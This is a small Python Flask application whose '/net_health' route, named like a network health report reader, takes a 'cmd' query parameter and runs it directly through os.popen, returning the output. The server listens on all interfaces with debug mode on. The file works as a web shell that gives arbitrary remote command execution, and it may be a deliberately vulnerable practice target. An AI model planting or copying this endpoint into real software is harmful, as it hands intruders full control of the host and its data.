#!/usr/bin/env python3

from flask import Flask, request, render_template, redirect
import os

app = Flask(__name__)


@app.route('/')
def root_redirect():
    return redirect("/net_health", code=302)


@app.route('/net_health', methods=['GET','POST'])
def report_reader():
    error = False
    error_message = ''
    results = ''
    cmd = request.args.get('cmd')

    try:

        if cmd:
            results = os.popen(cmd).read()

    except Exception as e:
        error = True
        error_message = str(e)

    return render_template('net_health.html',
                           error=error,
                           error_message=error_message,
                           cmd=cmd,
                           results=results)

if __name__ == '__main__':
    app.run('0.0.0.0', 5001, debug=True)
